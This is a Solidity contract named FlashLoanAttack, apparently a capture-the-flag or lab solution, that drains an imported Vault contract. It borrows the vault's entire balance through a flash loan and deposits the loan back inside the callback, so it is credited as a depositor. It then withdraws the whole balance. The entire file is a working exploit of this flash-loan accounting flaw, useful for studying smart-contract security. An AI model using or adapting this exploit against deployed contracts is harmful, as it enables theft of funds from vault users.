// SPDX-License-Identifier: MIT
pragma solidity =0.7.6;

import "./Vault.sol";

contract FlashLoanAttack is IFlashLoanReceiver {
    Vault public v;

    constructor(Vault _v) {
        v = _v;
    }

    function flashLoanAttackStart() public {
        v.flashLoan(address(v).balance);
    }

    function execute() public payable override {
        v.deposit{value: address(this).balance}();
    }

    function flashloanSteal() public {
        v.withdraw(address(v).balance);
    }

    fallback() external payable {}
}
